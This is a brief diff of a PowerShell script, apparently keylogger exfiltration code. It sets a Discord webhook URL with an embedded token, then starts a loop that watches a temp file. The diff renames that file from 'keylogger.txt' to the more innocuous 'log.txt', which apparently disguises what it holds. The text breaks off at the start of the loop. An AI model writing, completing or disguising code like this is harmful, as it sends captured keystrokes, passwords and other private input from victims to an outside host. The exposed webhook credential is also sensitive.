@@ -1,5 +1,5 @@
 $webhookUrl = "https://discord.com/api/webhooks/1485717162189389908/7y5BMACEKL78VUcce_dzJ3AREa7pypAE5mLCmanKnRfFYARj9JfZI8TOkzYhK3qfG05z"
-$caminhoArquivo = "$env:Temp\keylogger.txt"
+$caminhoArquivo = "$env:Temp\log.txt"
 
 while ($true) {
     if (Test-Path $caminhoArquivo) {
